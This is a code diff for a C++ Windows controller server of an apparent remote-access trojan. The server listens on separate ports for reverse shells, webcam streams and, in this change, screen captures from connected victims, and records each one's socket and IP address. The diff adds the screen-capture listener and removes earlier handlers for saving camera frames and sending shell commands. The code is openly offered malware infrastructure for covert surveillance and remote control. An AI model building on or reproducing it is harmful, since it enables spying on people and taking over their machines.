@@ -1,7 +1,7 @@
 #include "Communication.h"
 
-Communication::Communication(short revshell_port, short camera_port)
-    : _revshell_port(revshell_port), _camera_port(camera_port) {
+Communication::Communication(short revshell_port, short camera_port, short screen_port)
+    : _revshell_port(revshell_port), _camera_port(camera_port), _screen_port(screen_port) {
     WSADATA wsaData;
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
         throw std::runtime_error("WSAStartup failed");
@@ -36,11 +36,13 @@ SOCKET Communication::createServerSocket(short port) {
 }
 
 void Communication::acceptClients() {
-    std::thread shellThread(&Communication::acceptShell, this);
-    std::thread cameraThread(&Communication::acceptCamera, this);
+    thread shellThread(&Communication::acceptShell, this);
+    thread cameraThread(&Communication::acceptCamera, this);
+    thread screenThread(&Communication::acceptScreens, this);
 
     shellThread.join();
     cameraThread.join();
+    screenThread.join();
 }
 
 void Communication::acceptShell() {
@@ -56,8 +58,6 @@ void Communication::acceptShell() {
             throw std::runtime_error("Communication::acceptShell() - accept");
         }
 
-        //std::thread handlerThread(&Communication::shellHandler, this, clientSocket);
-        //handlerThread.detach();
         id++;
     }
 }
@@ -76,83 +76,25 @@ void Communication::acceptCamera() {
             throw std::runtime_error("Communication::acceptCamera() - accept");
         }
 
-//        std::thread handlerThread(&Communication::cameraHandler, this, clientSocket);
-//        handlerThread.detach();
+        id++;
     }
 }
 
-void Communication::cameraHandler(SOCKET cameraSocket) {
-    int i = 0;
-    string file_name = "0frame.png";
-    string end = "";
-    try {
-        while (true) {
+void Communication::acceptScreens() {
+    SOCKET serverSocket = createServerSocket(_screen_port);
 
-            std::ofstream outFile;
-            file_name[0] = std::to_string(i)[0];
-            outFile.open(file_name, std::ios::binary | std::ios::out);
+    unsigned int id = 1000;
 
-            if (!outFile.is_open()) {
-                throw std::runtime_error("Failed to open file");
-            }
+    while (true) {
+        SOCKET clientSocket = accept(serverSocket, nullptr, nullptr);
 
-            char buffer[1024] = { 0 };
-            int bytesReceived = 0;
-            end = "";
-            while (end != "noam") {
-                bytesReceived = recv(cameraSocket, buffer, sizeof(buffer), 0);                
-                end = buffer;
-                end = end.substr(0, 4);
-                if (end == "noam") {
-                    break;
-                }
-                outFile.write(buffer, bytesReceived);
-            }
+        _screens[id] = { clientSocket , getIP(clientSocket) };
 
-            if (bytesReceived == SOCKET_ERROR) {
-                throw std::runtime_error("Communication::cameraHandler() - recv");
-            }
-
-            outFile.close();
-            i++;
+        if (clientSocket == INVALID_SOCKET) {
+            throw std::runtime_error("Communication::acceptCamera() - accept");
         }
-    }
-    catch (const std::exception& e) {
-        std::cerr << "Error: " << e.what() << std::endl;
-        closesocket(cameraSocket);
-    }
-}
 
-void Communication::shellHandler(SOCKET shellSocket) {
-    string data;
-    try {
-        // Handle shell requests here
-        while (true) {
-            std::cout << ">> ";
-            std::cin >> data;
-            send(shellSocket, data.c_str(), data.size(), 0);
-            char buffer[1024] = { 0 };
-            int bytesReceived = recv(shellSocket, buffer, sizeof(buffer), 0);
-
-            int result = (static_cast<unsigned char>(buffer[0]) << 24) |
-                (static_cast<unsigned char>(buffer[1]) << 16) |
-                (static_cast<unsigned char>(buffer[2]) << 8) |
-                (static_cast<unsigned char>(buffer[3]));
-            string res = buffer;
-            res = res.substr(bytesReceived - 4, 4);
-
-            if (bytesReceived <= 0) {
-                throw std::runtime_error("Communication::shellHandler() - recv");
-            }
-
-            std::cout << "Shell data: " << res << std::endl;
-
-            // Send response if needed
-        }
-    }
-    catch (const std::exception& e) {
-        std::cerr << "Error: " << e.what() << std::endl;
-        closesocket(shellSocket);
+        id++;
     }
 }
 
@@ -179,4 +121,8 @@ map<unsigned int, tuple<SOCKET, string>> Communication::getRevShells(){
 
 map<unsigned int, tuple<SOCKET, string>> Communication::getCameras(){
     return _cameras;
+}
+
+map<unsigned int, tuple<SOCKET, string>> Communication::getScreens() {
+    return _screens;
 }
